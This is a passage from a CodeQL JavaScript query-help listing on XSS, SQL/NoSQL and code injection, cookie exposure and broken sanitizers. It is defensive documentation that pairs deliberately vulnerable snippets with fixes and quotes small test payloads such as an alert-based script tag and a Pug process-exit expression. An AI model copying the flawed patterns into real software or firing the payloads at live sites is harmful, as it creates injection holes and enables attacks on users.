  metadata:
    name: Client-side cross-site scripting
    description: |-
      Writing user input directly to the DOM allows for
                    a cross-site scripting vulnerability.
    kind: path-problem
    problem.severity: error
    security-severity: 7.8
    precision: high
    id: js/xss
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: |
    # Client-side cross-site scripting
    Directly writing user input (for example, a URL query parameter) to a webpage without properly sanitizing the input first, allows for a cross-site scripting vulnerability.

    This kind of vulnerability is also called *DOM-based* cross-site scripting, to distinguish it from other types of cross-site scripting.


    ## Recommendation
    To guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the page, or one of the other solutions that are mentioned in the references.


    ## Example
    The following example shows part of the page URL being written directly to the document, leaving the website vulnerable to cross-site scripting.


    ```javascript
    function setLanguageOptions() {
        var href = document.location.href,
            deflt = href.substring(href.indexOf("default=")+8);
        document.write("<OPTION value=1>"+deflt+"</OPTION>");
        document.write("<OPTION value=2>English</OPTION>");
    }

    ```

    ## References
    * OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
    * OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).
    * OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-079/XssThroughDom.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/XssThroughDom.bqrs
  metadata:
    name: DOM text reinterpreted as HTML
    description: |-
      Reinterpreting text from the DOM as HTML
                    can lead to a cross-site scripting vulnerability.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    precision: high
    id: js/xss-through-dom
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: "# DOM text reinterpreted as HTML\nExtracting text from a DOM node and\
    \ interpreting it as HTML can lead to a cross-site scripting vulnerability.\n\n\
    A webpage with this vulnerability reads text from the DOM, and afterwards adds\
    \ the text as HTML to the DOM. Using text from the DOM as HTML effectively unescapes\
    \ the text, and thereby invalidates any escaping done on the text. If an attacker\
    \ is able to control the safe sanitized text, then this vulnerability can be exploited\
    \ to perform a cross-site scripting attack.\n\n\n## Recommendation\nTo guard against\
    \ cross-site scripting, consider using contextual output encoding/escaping before\
    \ writing text to the page, or one of the other solutions that are mentioned in\
    \ the References section below.\n\n\n## Example\nThe following example shows a\
    \ webpage using a `data-target` attribute to select and manipulate a DOM element\
    \ using the JQuery library. In the example, the `data-target` attribute is read\
    \ into the `target` variable, and the `$` function is then supposed to use the\
    \ `target` variable as a CSS selector to determine which element should be manipulated.\n\
    \n\n```javascript\n$(\"button\").click(function () {\n    var target = $(this).attr(\"\
    data-target\");\n    $(target).hide();\n});\n\n```\nHowever, if an attacker can\
    \ control the `data-target` attribute, then the value of `target` can be used\
    \ to cause the `$` function to execute arbitrary JavaScript.\n\nThe above vulnerability\
    \ can be fixed by using `$.find` instead of `$`. The `$.find` function will only\
    \ interpret `target` as a CSS selector and never as HTML, thereby preventing an\
    \ XSS attack.\n\n\n```javascript\n$(\"button\").click(function () {\n    var target\
    \ = $(this).attr(\"data-target\");\n\t$.find(target).hide();\n});\n\n```\n\n##\
    \ References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
    * OWASP [DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS).\n\
    * OWASP [Types of Cross-Site Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting).\n\
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-089/SqlInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-089/SqlInjection.bqrs
  metadata:
    name: Database query built from user-controlled sources
    description: |-
      Building a database query from user-controlled sources is vulnerable to insertion of
                    malicious code by the user.
    kind: path-problem
    problem.severity: error
    security-severity: 8.8
    precision: high
    id: js/sql-injection
    tags: |-
      security
             external/cwe/cwe-089
             external/cwe/cwe-090
             external/cwe/cwe-943
  queryHelp: |
    # Database query built from user-controlled sources
    If a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run malicious database queries.


    ## Recommendation
    Most database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.

    For NoSQL queries, make use of an operator like MongoDB's `$eq` to ensure that untrusted data is interpreted as a literal value and not as a query object. Alternatively, check that the untrusted data is a literal value and not a query object before using it in a query.

    For SQL queries, use query parameters or prepared statements to embed untrusted data into the query string, or use a library like `sqlstring` to escape untrusted data.


    ## Example
    In the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object.

    The handler constructs an SQL query string from user input and executes it as a database query using the `pg` library. The user input may contain quote characters, so this code is vulnerable to a SQL injection attack.


    ```javascript
    const app = require("express")(),
          pg = require("pg"),
          pool = new pg.Pool(config);

    app.get("search", function handler(req, res) {
      // BAD: the category might have SQL special characters in it
      var query1 =
        "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='" +
        req.params.category +
        "' ORDER BY PRICE";
      pool.query(query1, [], function(err, results) {
        // process results
      });
    });

    ```
    To fix this vulnerability, we can use query parameters to embed the user input into the query string. In this example, we use the API offered by the `pg` Postgres database connector library, but other libraries offer similar features. This version is immune to injection attacks.


    ```javascript
    const app = require("express")(),
          pg = require("pg"),
          pool = new pg.Pool(config);

    app.get("search", function handler(req, res) {
      // GOOD: use parameters
      var query2 =
        "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1 ORDER BY PRICE";
      pool.query(query2, [req.params.category], function(err, results) {
        // process results
      });
    });

    ```
    Alternatively, we can use a library like `sqlstring` to escape the user input before embedding it into the query string:


    ```javascript
    const app = require("express")(),
          pg = require("pg"),
          SqlString = require('sqlstring'),
          pool = new pg.Pool(config);

    app.get("search", function handler(req, res) {
      // GOOD: the category is escaped using mysql.escape
      var query1 =
        "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='" +
        SqlString.escape(req.params.category) +
        "' ORDER BY PRICE";
      pool.query(query1, [], function(err, results) {
        // process results
      });
    });

    ```

    ## Example
    In the following example, an express handler attempts to delete a single document from a MongoDB collection. The document to be deleted is identified by its `_id` field, which is constructed from user input. The user input may contain a query object, so this code is vulnerable to a NoSQL injection attack.


    ```javascript
    const express = require("express");
    const mongoose = require("mongoose");
    const Todo = mongoose.model(
      "Todo",
      new mongoose.Schema({ text: { type: String } }, { timestamps: true })
    );

    const app = express();
    app.use(express.json());
    app.use(express.urlencoded({ extended: false }));

    app.delete("/api/delete", async (req, res) => {
      let id = req.body.id;

      await Todo.deleteOne({ _id: id }); // BAD: id might be an object with special properties

      res.json({ status: "ok" });
    });

    ```
    To fix this vulnerability, we can use the `$eq` operator to ensure that the user input is interpreted as a literal value and not as a query object:


    ```javascript
    app.delete("/api/delete", async (req, res) => {
      let id = req.body.id;
      await Todo.deleteOne({ _id: { $eq: id } }); // GOOD: using $eq operator for the comparison

      res.json({ status: "ok" });
    });
    ```
    Alternatively check that the user input is a literal value and not a query object before using it:


    ```javascript
    app.delete("/api/delete", async (req, res) => {
      let id = req.body.id;
      if (typeof id !== "string") {
        res.status(400).json({ status: "error" });
        return;
      }
      await Todo.deleteOne({ _id: id }); // GOOD: id is guaranteed to be a string

      res.json({ status: "ok" });
    });

    ```

    ## References
    * Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).
    * MongoDB: [$eq operator](https://docs.mongodb.com/manual/reference/operator/query/eq).
    * OWASP: [NoSQL injection](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf).
    * Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).
    * Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).
    * Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-094/CodeInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-094/CodeInjection.bqrs
  metadata:
    name: Code injection
    description: |-
      Interpreting unsanitized user input as code allows a malicious user arbitrary
                    code execution.
    kind: path-problem
    problem.severity: error
    security-severity: 9.3
    precision: high
    id: js/code-injection
    tags: |-
      security
             external/cwe/cwe-094
             external/cwe/cwe-095
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: |
    # Code injection
    Directly evaluating user input (for example, an HTTP request parameter) as code without properly sanitizing the input first allows an attacker arbitrary code execution. This can occur when user input is treated as JavaScript, or passed to a framework which interprets it as an expression to be evaluated. Examples include AngularJS expressions or JQuery selectors.


    ## Recommendation
    Avoid including user input in any expression which may be dynamically evaluated. If user input must be included, use context-specific escaping before including it. It is important that the correct escaping is used for the type of evaluation that will occur.


    ## Example
    The following example shows part of the page URL being evaluated as JavaScript code. This allows an attacker to provide JavaScript within the URL. If an attacker can persuade a user to click on a link to such a URL, the attacker can evaluate arbitrary JavaScript in the browser of the user to, for example, steal cookies containing session information.


    ```javascript
    eval(document.location.href.substring(document.location.href.indexOf("default=")+8))

    ```
    The following example shows a Pug template being constructed from user input, allowing attackers to run arbitrary code via a payload such as `#{global.process.exit(1)}`.


    ```javascript
    const express = require('express')
    var pug = require('pug');
    const app = express()

    app.post('/', (req, res) => {
        var input = req.query.username;
        var template = `
    doctype
    html
    head
        title= 'Hello world'
    body
        form(action='/' method='post')
            input#name.form-control(type='text)
            button.btn.btn-primary(type='submit') Submit
        p Hello `+ input
        var fn = pug.compile(template);
        var html = fn();
        res.send(html);
    })

    ```
    Below is an example of how to use a template engine without any risk of template injection. The user input is included via an interpolation expression `#{username}` whose value is provided as an option to the template, instead of being part of the template string itself:


    ```javascript
    const express = require('express')
    var pug = require('pug');
    const app = express()

    app.post('/', (req, res) => {
        var input = req.query.username;
        var template = `
    doctype
    html
    head
        title= 'Hello world'
    body
        form(action='/' method='post')
            input#name.form-control(type='text)
            button.btn.btn-primary(type='submit') Submit
        p Hello #{username}`
        var fn = pug.compile(template);
        var html = fn({username: input});
        res.send(html);
    })

    ```

    ## References
    * OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).
    * Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).
    * PortSwigger Research Blog: [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection).
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
    * Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-094/ImproperCodeSanitization.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-094/ImproperCodeSanitization.bqrs
  metadata:
    name: Improper code sanitization
    description: Escaping code as HTML does not provide protection against code injection.
    kind: path-problem
    problem.severity: error
    security-severity: 6.1
    precision: high
    id: js/bad-code-sanitization
    tags: |-
      security
             external/cwe/cwe-094
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: |
    # Improper code sanitization
    Using string concatenation to construct JavaScript code can be error-prone, or in the worst case, enable code injection if an input is constructed by an attacker.


    ## Recommendation
    If using `JSON.stringify` or an HTML sanitizer to sanitize a string inserted into JavaScript code, then make sure to perform additional sanitization or remove potentially dangerous characters.


    ## Example
    The example below constructs a function that assigns the number 42 to the property `key` on an object `obj`. However, if `key` contains `</script>`, then the generated code will break out of a `</script>` if inserted into a `</script>` tag.


    ```javascript
    function createObjectWrite() {
        const assignment = `obj[${JSON.stringify(key)}]=42`;
        return `(function(){${assignment}})` // NOT OK
    }
    ```
    The issue has been fixed by escaping potentially dangerous characters, as shown below.


    ```javascript
    const charMap = {
        '<': '\\u003C',
        '>' : '\\u003E',
        '/': '\\u002F',
        '\\': '\\\\',
        '\b': '\\b',
        '\f': '\\f',
        '\n': '\\n',
        '\r': '\\r',
        '\t': '\\t',
        '\0': '\\0',
        '\u2028': '\\u2028',
        '\u2029': '\\u2029'
    };

    function escapeUnsafeChars(str) {
        return str.replace(/[<>\b\f\n\r\t\0\u2028\u2029]/g, x => charMap[x])
    }

    function createObjectWrite() {
        const assignment = `obj[${escapeUnsafeChars(JSON.stringify(key))}]=42`;
        return `(function(){${assignment}})` // OK
    }
    ```

    ## References
    * OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-094/UnsafeCodeConstruction.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-094/UnsafeCodeConstruction.bqrs
  metadata:
    name: Unsafe code constructed from library input
    description: |-
      Using externally controlled strings to construct code may allow a malicious
                    user to execute arbitrary code.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    precision: medium
    id: js/unsafe-code-construction
    tags: |-
      security
             external/cwe/cwe-094
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: |
    # Unsafe code constructed from library input
    When a library function dynamically constructs code in a potentially unsafe way, then it's important to document to clients of the library that the function should only be used with trusted inputs. If the function is not documented as being potentially unsafe, then a client may incorrectly use inputs containing unsafe code fragments, and thereby leave the client vulnerable to code-injection attacks.


    ## Recommendation
    Properly document library functions that construct code from unsanitized inputs, or avoid constructing code in the first place.


    ## Example
    The following example shows two methods implemented using \`eval\`: a simple deserialization routine and a getter method. If untrusted inputs are used with these methods, then an attacker might be able to execute arbitrary code on the system.


    ```javascript
    export function unsafeDeserialize(value) {
      return eval(`(${value})`);
    }

    export function unsafeGetter(obj, path) {
        return eval(`obj.${path}`);
    }

    ```
    To avoid this problem, either properly document that the function is potentially unsafe, or use an alternative solution such as \`JSON.parse\` or another library, like in the examples below, that does not allow arbitrary code to be executed.


    ```javascript
    export function safeDeserialize(value) {
      return JSON.parse(value);
    }

    const _ = require("lodash");
    export function safeGetter(object, path) {
      return _.get(object, path);
    }

    ```

    ## References
    * OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).
    * Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-094/UnsafeDynamicMethodAccess.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-094/UnsafeDynamicMethodAccess.bqrs
  metadata:
    name: Unsafe dynamic method access
    description: Invoking user-controlled methods on certain objects can lead to remote
      code execution.
    kind: path-problem
    problem.severity: error
    security-severity: 9.3
    precision: high
    id: js/unsafe-dynamic-method-access
    tags: |-
      security
             external/cwe/cwe-094
  queryHelp: "# Unsafe dynamic method access\nCalling a user-controlled method on\
    \ certain objects can lead to invocation of unsafe functions, such as `eval` or\
    \ the `Function` constructor. In particular, the global object contains the `eval`\
    \ function, and any function object contains the `Function` constructor in its\
    \ `constructor` property.\n\n\n## Recommendation\nAvoid invoking user-controlled\
    \ methods on the global object or on any function object. Whitelist the permitted\
    \ method names or change the type of object the methods are stored on.\n\n\n##\
    \ Example\nIn the following example, a message from the document's parent frame\
    \ can invoke the `play` or `pause` method. However, it can also invoke `eval`.\
    \ A malicious website could embed the page in an iframe and execute arbitrary\
    \ code by sending a message with the name `eval`.\n\n\n```javascript\n// API methods\n\
    function play(data) {\n  // ...\n}\nfunction pause(data) {\n  // ...\n}\n\nwindow.addEventListener(\"\
    message\", (ev) => {\n    let message = JSON.parse(ev.data);\n\n    // Let the\
    \ parent frame call the 'play' or 'pause' function \n    window[message.name](message.payload);\n\
    });\n\n```\nInstead of storing the API methods in the global scope, put them in\
    \ an API object or Map. It is also good practice to prevent invocation of inherited\
    \ methods like `toString` and `valueOf`.\n\n\n```javascript\n// API methods\n\
    let api = {\n  play: function(data) {\n    // ...\n  },\n  pause: function(data)\
    \ {\n    // ...\n  }\n};\n\nwindow.addEventListener(\"message\", (ev) => {\n \
    \   let message = JSON.parse(ev.data);\n\n    // Let the parent frame call the\
    \ 'play' or 'pause' function\n    if (!api.hasOwnProperty(message.name)) {\n \
    \     return;\n    }\n    api[message.name](message.payload);\n});\n\n```\n\n\
    ## References\n* OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).\n\
    * MDN: [Global functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects#Function_properties).\n\
    * MDN: [Function constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function).\n\
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-1004/ClientExposedCookie.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-1004/ClientExposedCookie.bqrs
  metadata:
    name: Sensitive server cookie exposed to the client
    description: Sensitive cookies set by a server can be read by the client if the
      `httpOnly` flag is not set.
    kind: problem
    problem.severity: warning
    security-severity: 5.0
    precision: high
    id: js/client-exposed-cookie
    tags: |-
      security
             external/cwe/cwe-1004
  queryHelp: |
    # Sensitive server cookie exposed to the client
    Authentication cookies stored by a server can be accessed by a client if the `httpOnly` flag is not set.

    An attacker that manages a cross-site scripting (XSS) attack can read the cookie and hijack the session.


    ## Recommendation
    Set the `httpOnly` flag on all cookies that are not needed by the client.


    ## Example
    The following example stores an authentication token in a cookie that can be viewed by the client.


    ```javascript
    const http = require('http');

    const server = http.createServer((req, res) => {
        res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}`);
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('<h2>Hello world</h2>');
    });
    ```
    To force the cookie to be transmitted using SSL, set the `secure` attribute on the cookie.


    ```javascript
    const http = require('http');

    const server = http.createServer((req, res) => {
        res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly`);
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('<h2>Hello world</h2>');
    });
    ```

    ## References
    * ExpressJS: [Use cookies securely](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely).
    * OWASP: [Set cookie flags appropriately](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html#set-cookie-flags-appropriately).
    * Mozilla: [Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie).
    * Common Weakness Enumeration: [CWE-1004](https://cwe.mitre.org/data/definitions/1004.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-116/BadTagFilter.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/BadTagFilter.bqrs
  metadata:
    name: Bad HTML filtering regexp
    description: "Matching HTML tags using regular expressions is hard to do right,\
      \ and can easily lead to security issues."
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/bad-tag-filter
    tags: |-
      correctness
             security
             external/cwe/cwe-020
             external/cwe/cwe-080
             external/cwe/cwe-116
             external/cwe/cwe-184
             external/cwe/cwe-185
             external/cwe/cwe-186
  queryHelp: |
    # Bad HTML filtering regexp
    It is possible to match some single HTML tags using regular expressions (parsing general HTML using regular expressions is impossible). However, if the regular expression is not written well it might be possible to circumvent it, which can lead to cross-site scripting or other security issues.

    Some of these mistakes are caused by browsers having very forgiving HTML parsers, and will often render invalid HTML containing syntax errors. Regular expressions that attempt to match HTML should also recognize tags containing such syntax errors.


    ## Recommendation
    Use a well-tested sanitization or parser library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.


    ## Example
    The following example attempts to filters out all `<script>` tags.


    ```javascript
    function filterScript(html) {
        var scriptRegex = /<script\b[^>]*>([\s\S]*?)<\/script>/gi;
        var match;
        while ((match = scriptRegex.exec(html)) !== null) {
            html = html.replace(match[0], match[1]);
        }
        return html;
    }

    ```
    The above sanitizer does not filter out all `<script>` tags. Browsers will not only accept `</script>` as script end tags, but also tags such as `</script foo="bar">` even though it is a parser error. This means that an attack string such as `<script>alert(1)</script foo="bar">` will not be filtered by the function, and `alert(1)` will be executed by a browser if the string is rendered as HTML.

    Other corner cases include that HTML comments can end with `--!>`, and that HTML tag names can contain upper case characters.


    ## References
    * Securitum: [The Curious Case of Copy &amp; Paste](https://research.securitum.com/the-curious-case-of-copy-paste/).
    * stackoverflow.com: [You can't parse \[X\]HTML with regex](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags#answer-1732454).
    * HTML Standard: [Comment end bang state](https://html.spec.whatwg.org/multipage/parsing.html#comment-end-bang-state).
    * stackoverflow.com: [Why aren't browsers strict about HTML?](https://stackoverflow.com/questions/25559999/why-arent-browsers-strict-about-html).
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
    * Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
    * Common Weakness Enumeration: [CWE-184](https://cwe.mitre.org/data/definitions/184.html).
    * Common Weakness Enumeration: [CWE-185](https://cwe.mitre.org/data/definitions/185.html).
    * Common Weakness Enumeration: [CWE-186](https://cwe.mitre.org/data/definitions/186.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-116/DoubleEscaping.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/DoubleEscaping.bqrs
  metadata:
    name: Double escaping or unescaping
    description: |-
      When escaping special characters using a meta-character like backslash or
                    ampersand, the meta-character has to be escaped first to avoid double-escaping,
                    and conversely it has to be unescaped last to avoid double-unescaping.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/double-escaping
    tags: |-
      correctness
             security
             external/cwe/cwe-116
             external/cwe/cwe-020
  queryHelp: |
    # Double escaping or unescaping
    Escaping meta-characters in untrusted input is an important technique for preventing injection attacks such as cross-site scripting. One particular example of this is HTML entity encoding, where HTML special characters are replaced by HTML character entities to prevent them from being interpreted as HTML markup. For example, the less-than character is encoded as `&lt;` and the double-quote character as `&quot;`. Other examples include backslash-escaping for including untrusted data in string literals and percent-encoding for URI components.

    The reverse process of replacing escape sequences with the characters they represent is known as unescaping.

    Note that the escape characters themselves (such as ampersand in the case of HTML encoding) play a special role during escaping and unescaping: they are themselves escaped, but also form part of the escaped representations of other characters. Hence care must be taken to avoid double escaping and unescaping: when escaping, the escape character must be escaped first, when unescaping it has to be unescaped last.

    If used in the context of sanitization, double unescaping may render the sanitization ineffective. Even if it is not used in a security-critical context, it may still result in confusing or garbled output.


    ## Recommendation
    Use a (well-tested) sanitization library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation. For URI encoding, you can use the standard `encodeURIComponent` and `decodeURIComponent` functions.

    Otherwise, make sure to always escape the escape character first, and unescape it last.


    ## Example
    The following example shows a pair of hand-written HTML encoding and decoding functions:


    ```javascript
    module.exports.encode = function(s) {
      return s.replace(/&/g, "&amp;")
              .replace(/"/g, "&quot;")
              .replace(/'/g, "&apos;");
    };

    module.exports.decode = function(s) {
      return s.replace(/&amp;/g, "&")
              .replace(/&quot;/g, "\"")
              .replace(/&apos;/g, "'");
    };

    ```
    The encoding function correctly handles ampersand before the other characters. For example, the string `me & "you"` is encoded as `me &amp; &quot;you&quot;`, and the string `&quot;` is encoded as `&amp;quot;`.

    The decoding function, however, incorrectly decodes `&amp;` into `&` before handling the other characters. So while it correctly decodes the first example above, it decodes the second example (`&amp;quot;`) to `"` (a single double quote), which is not correct.

    Instead, the decoding function should decode the ampersand last:


    ```javascript
    module.exports.encode = function(s) {
      return s.replace(/&/g, "&amp;")
              .replace(/"/g, "&quot;")
              .replace(/'/g, "&apos;");
    };

    module.exports.decode = function(s) {
      return s.replace(/&quot;/g, "\"")
              .replace(/&apos;/g, "'")
              .replace(/&amp;/g, "&");
    };

    ```

    ## References
    * OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).
    * npm: [html-entities](https://www.npmjs.com/package/html-entities) package.
    * npm: [js-string-escape](https://www.npmjs.com/package/js-string-escape) package.
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-116/IncompleteHtmlAttributeSanitization.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/IncompleteHtmlAttributeSanitization.bqrs
  metadata:
    name: Incomplete HTML attribute sanitization
    description: |-
      Writing incompletely sanitized values to HTML
                    attribute strings can lead to a cross-site
                    scripting vulnerability.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    precision: high
    id: js/incomplete-html-attribute-sanitization
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
             external/cwe/cwe-020
  queryHelp: "# Incomplete HTML attribute sanitization\nSanitizing untrusted input\
    \ for HTML meta-characters is a common technique for preventing cross-site scripting\
    \ attacks. Usually, this is done by escaping `<`, `>`, `&` and `\"`. However,\
    \ the context in which the sanitized value is used decides the characters that\
    \ need to be sanitized.\n\nAs a consequence, some programs only sanitize `<` and\
    \ `>` since those are the most common dangerous characters. The lack of sanitization\
    \ for `\"` is problematic when an incompletely sanitized value is used as an HTML\
    \ attribute in a string that later is parsed as HTML.\n\n\n## Recommendation\n\
    Sanitize all relevant HTML meta-characters when constructing HTML dynamically,\
    \ and pay special attention to where the sanitized value is used.\n\nAn even safer\
    \ alternative is to design the application so that sanitization is not needed,\
    \ for instance by using HTML templates that are explicit about the values they\
    \ treat as HTML.\n\n\n## Example\nThe following example code writes part of an\
    \ HTTP request (which is controlled by the user) to an HTML attribute of the server\
    \ response. The user-controlled value is, however, not sanitized for `\"`. This\
    \ leaves the website vulnerable to cross-site scripting since an attacker can\
    \ use a string like `\" onclick=\"alert(42)` to inject JavaScript code into the\
    \ response.\n\n\n```javascript\nvar app = require('express')();\n\napp.get('/user/:id',\
    \ function(req, res) {\n\tlet id = req.params.id;\n\tid = id.replace(/<|>/g, \"\
    \"); // BAD\n\tlet userHtml = `<div data-id=\"${id}\">${getUserName(id) || \"\
    Unknown name\"}</div>`;\n\t// ...\n\tres.send(prefix + userHtml + suffix);\n});\n\
    \n```\nSanitizing the user-controlled data for `\"` helps prevent the vulnerability:\n\
    \n\n```javascript\nvar app = require('express')();\n\napp.get('/user/:id', function(req,\
    \ res) {\n\tlet id = req.params.id;\n\tid = id.replace(/<|>|&|\"/g, \"\"); //\
    \ GOOD\n\tlet userHtml = `<div data-id=\"${id}\">${getUserName(id) || \"Unknown\
    \ name\"}</div>`;\n\t// ...\n\tres.send(prefix + userHtml + suffix);\n});\n\n\
    ```\n\n## References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
    * OWASP [Types of Cross-Site](https://owasp.org/www-community/Types_of_Cross-Site_Scripting).\n\
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n\
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-116/IncompleteMultiCharacterSanitization.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/IncompleteMultiCharacterSanitization.bqrs
  metadata:
    name: Incomplete multi-character sanitization
    description: A sanitizer that removes a sequence of characters may reintroduce
      the dangerous sequence.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/incomplete-multi-character-sanitization
    tags: |-
      correctness
             security
             external/cwe/cwe-020
             external/cwe/cwe-080
             external/cwe/cwe-116
